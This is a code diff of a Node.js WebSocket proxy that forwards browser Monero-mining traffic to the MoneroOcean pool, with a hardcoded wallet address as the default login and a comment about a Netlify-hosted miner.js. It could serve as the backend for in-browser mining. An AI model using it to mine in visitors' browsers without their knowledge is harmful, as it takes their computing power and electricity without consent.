@@ -29,17 +29,18 @@ wss.on('connection', (ws) => {
                 if (stratumClient) stratumClient.destroy();
                 stratumClient = new net.Socket();
                 
-                // Conectando na porta alternativa adaptada para algoritmos de CPU leve na MoneroOcean
+                // Conecta na porta padrão da MoneroOcean
                 stratumClient.connect(18081, 'gulf.moneroocean.stream', () => {
-                    console.log('✅ Proxy conectado via TCP à Pool MoneroOcean (CN-Lite Protocol)');
+                    console.log('✅ Proxy conectado via TCP à Pool MoneroOcean!');
                     poolConnected = true;
 
+                    // CORREÇÃO: Captura exatamente as chaves enviadas pelo miner.js do Netlify
                     const stratumLogin = {
                         id: 1,
                         method: "login",
                         params: {
-                            login: data.login,
-                            pass: "cn-lite",
+                            login: data.login || data.wallet || "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi",
+                            pass: data.password || "x",
                             agent: "XMR-CryptoNightWeb/1.0"
                         }
                     };
